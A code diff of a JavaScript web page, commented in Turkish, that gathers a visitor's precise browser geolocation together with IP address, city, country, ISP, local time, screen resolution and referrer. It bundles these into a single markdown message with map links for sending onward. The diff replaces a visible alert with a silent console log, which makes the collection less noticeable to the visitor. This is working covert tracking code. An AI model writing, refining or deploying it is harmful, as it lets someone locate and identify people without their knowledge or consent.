@@ -40,9 +40,9 @@
 
             // Gerçek konumu almayı dene
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(saveRealPosition, sendFinalMessage);  
+                navigator.geolocation.getCurrentPosition(saveRealPosition, sendFinalMessage);
             } else {
-                alert("Geolocation tarayıcınız tarafından desteklenmiyor.");
+                console.log("Geolocation tarayıcınız tarafından desteklenmiyor.");
                 sendFinalMessage();  // Geolocation desteklenmiyorsa yalnızca IP tabanlı bilgileri gönder
             }
         };
@@ -53,12 +53,14 @@
             var realLongitude = position.coords.longitude;
             var realMapLink = `https://www.google.com/maps?q=${realLatitude},${realLongitude}`;
 
+            // Gerçek konum bilgilerini combinedMessage'a ekle
             combinedMessage += `**Gerçek Konum Bilgileri**:\n` +
                                `Enlem: ${realLatitude}\n` +
                                `Boylam: ${realLongitude}\n` +
                                `[Google Maps'te Gör](<${realMapLink}>)\n\n`;
 
-            sendFinalMessage();  // Hem gerçek konum hem de IP bilgileri gönderilmek üzere devam edilir
+            // Tüm bilgileri tek mesaj olarak göndermek üzere IP tabanlı bilgileri de ekle
+            sendFinalMessage();
         }
 
         function fetchIPInfo() {
@@ -69,14 +71,15 @@
                 })
                 .then(function (data) {
                     ip = data.ip;
-                    latitude = latitude || data.latitude;  // Eğer gerçek konum yoksa IP konumunu kullan
-                    longitude = longitude || data.longitude;
+                    latitude = data.latitude;
+                    longitude = data.longitude;
                     city = data.city;
                     country = data.country_name;
                     countryCode = data.country.toLowerCase(); // Küçük harfe çevir
                     org = data.org;
-                    mapLink = mapLink || 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
+                    mapLink = 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
 
+                    // IP tabanlı bilgileri combinedMessage'a ekle
                     combinedMessage += `**IP ve Genel Bilgiler**:\n` +
                                        `IP: ${ip}\n` +
                                        `Enlem: ${latitude}\n` +
@@ -91,7 +94,6 @@
                                        `Yerel Zaman: ${yerelZaman}\n` +
                                        `Ekran Çözünürlüğü: ${ekranGenislik}x${ekranYukseklik}\n` +
                                        `Referer: ${referrer}\n\n`;
-
                 })
                 .catch(function (error) {
                     console.error('IP bilgileri alınırken hata:', error);
